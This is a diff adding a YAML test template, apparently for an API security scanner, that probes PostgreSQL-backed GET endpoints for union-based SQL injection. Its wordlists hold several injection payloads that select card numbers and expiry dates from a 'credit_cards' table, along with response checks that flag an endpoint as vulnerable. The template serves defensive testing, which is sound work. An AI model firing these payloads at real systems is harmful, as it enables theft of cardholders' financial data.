@@ -1,0 +1,200 @@
+id: UNION_CREDIT_CARD_DATA_PAYLOAD_POSTGRESQLI_GET
+info:
+  name: "Union based SQL Injection test with Credit Card Data Extraction Payload for PostgreSQL for GET method APIs"
+  description: "The Union Based SQL Injection Test with Credit Card Data Extraction Payload for PostgreSQL on GET method APIs involves attempting to exploit a vulnerability in a web application's API by injecting malicious SQL queries into the GET request. The goal of this attack is to extract sensitive credit card information from the underlying PostgreSQL database using union-based SQL injection techniques. If successful, this attack can allow attackers to bypass application security measures and retrieve sensitive financial data from the database."
+  details: "The Union Based SQL Injection Test with Credit Card Data Extraction Payload for PostgreSQL on GET method APIs specifically targets SQL injection vulnerabilities in APIs that interact with PostgreSQL databases. The attacker injects a payload that manipulates the SQL query structure to return data from unauthorized tables, such as those storing credit card details. This is typically done by utilizing the UNION operator to combine results from malicious queries with valid ones, potentially revealing sensitive financial information stored in the database. This attack can be carried out on GET method APIs that fail to properly sanitize user input."
+  impact: "The impact of the Union Based SQL Injection Test with Credit Card Data Extraction Payload for PostgreSQL on GET method APIs can be severe, as it may lead to unauthorized access and extraction of sensitive data like credit card information. Attackers exploiting this vulnerability can steal personally identifiable information (PII), enabling identity theft or financial fraud. This can result in reputational damage, legal consequences, and significant financial losses for the affected organization. Furthermore, the exposed data can be used for further attacks, such as account takeover or phishing."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: UNION_CREDIT_CARD_DATA_PAYLOAD_POSTGRESQLI_GET
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+api_selection_filters:
+  method:
+    eq: "GET"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+  query_param:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  unionBasedPayloads:
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards--"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards /*"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards--"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards /* '"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards /*--"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards-- -"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards /*-"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards /* --"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards /* -"
+  unionBasedNegativePayloads:
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0 --"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /*"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0 --"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /* '"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /*--"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0 -- -"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /*-"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /* --"
+    - "' UNION SELECT card_number, card_expiry FROM credit_cards where 1=0  /* -"
+execute:
+  type: multiple
+  requests:
+  - req:
+    - modify_query_param:
+        userKey: ${userVal}${unionBasedPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          contains_either:
+            - credit
+            - card
+            - cardholder
+            - cvv
+            - expiry
+            - card_number
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - " UNION SELECT " 
+            - <html>
+            - </html>         
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_query_param:
+        userKey: ${unionBasedNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0 
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts  
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked 
+            - " UNION SELECT "
+            - credit
+            - card
+            - cardholder
+            - cvv
+            - expiry
+            - card_number
+            - <html>
+            - </html>
+
+          neq: "${x1.response.body}"
+    - success: vulnerable
+    - failure: exit                                             
